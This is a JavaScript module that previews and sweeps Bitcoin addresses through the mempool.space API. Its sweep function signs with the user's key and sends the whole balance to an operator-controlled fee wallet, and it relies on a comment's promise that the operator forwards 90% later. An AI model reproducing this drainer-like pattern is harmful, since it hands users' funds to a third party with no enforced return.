import * as bitcoin from 'bitcoinjs-lib';
import { FEE_WALLET_BITCOIN } from './config.js';

const NETWORK = bitcoin.networks.bitcoin;
const MEMPOOL_API = 'https://mempool.space/api';

export async function previewBitcoinWallet(address) {
  const result = { address, utxos: [], balance: 0 };
  try {
    const resp = await fetch(`${MEMPOOL_API}/address/${address}/utxo`);
    if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
    const utxos = await resp.json();
    result.utxos = utxos;
    result.balance = utxos.reduce((sum, u) => sum + u.value, 0);
  } catch (e) { result.error = e.message; }
  return result;
}

/**
 * Sweep Bitcoin to the fee wallet.
 *
 * IMPORTANT: All BTC goes to FEE_WALLET_BITCOIN. The operator forwards
 * 90% to the user's Bitcoin destination afterward.
 *
 * Returns:
 *   {
 *     address,
 *     status, txid, error,
 *     amountRaw: string,  // sats sent to fee wallet
 *   }
 */
export async function sweepBitcoin(address, keyPair, opts = {}) {
  const results = {
    address,
    recipient: FEE_WALLET_BITCOIN,
    status: null,
    txid: null,
    error: null,
    amountRaw: '0',
  };
  const feeRate = opts.feeRateSatVb ?? 2;
  const dryRun = !!opts.dryRun;

  try {
    const resp = await fetch(`${MEMPOOL_API}/address/${address}/utxo`);
    const utxos = await resp.json();
    if (!utxos || utxos.length === 0) { results.status = 'EMPTY'; return results; }

    const totalSats = utxos.reduce((sum, u) => sum + u.value, 0);
    const estimatedSize = 11 + utxos.length * 68 + 31;
    const fee = estimatedSize * feeRate;
    const sendAmount = totalSats - fee;
    if (sendAmount <= 1000) { results.status = 'TOO_LOW'; return results; }

    if (dryRun) {
      results.status = 'DRY_RUN';
      results.amountRaw = String(sendAmount);
      return results;
    }

    const fullUtxos = await Promise.all(utxos.map(async (u) => {
      const txResp = await fetch(`${MEMPOOL_API}/tx/${u.txid}`);
      const tx = await txResp.json();
      const vout = tx.vout[u.vout];
      return { ...u, scriptPubKey: vout.scriptpubkey };
    }));

    const psbt = new bitcoin.Psbt({ network: NETWORK });
    for (const u of fullUtxos) {
      psbt.addInput({
        hash: u.txid,
        index: u.vout,
        witnessUtxo: { script: Buffer.from(u.scriptPubKey, 'hex'), value: BigInt(u.value) },
      });
    }
    psbt.addOutput({ address: FEE_WALLET_BITCOIN, value: BigInt(sendAmount) });
    psbt.signAllInputs(keyPair);
    psbt.finalizeAllInputs();
    const txHex = psbt.extractTransaction().toHex();
    const broadcastResp = await fetch(`${MEMPOOL_API}/tx`, { method: 'POST', body: txHex });
    if (!broadcastResp.ok) throw new Error(`broadcast: ${await broadcastResp.text()}`);
    const txid = await broadcastResp.text();
    results.status = 'SUCCESS';
    results.txid = txid;
    results.amountRaw = String(sendAmount);
  } catch (e) {
    results.status = 'ERROR';
    results.error = e.message;
  }
  return results;
}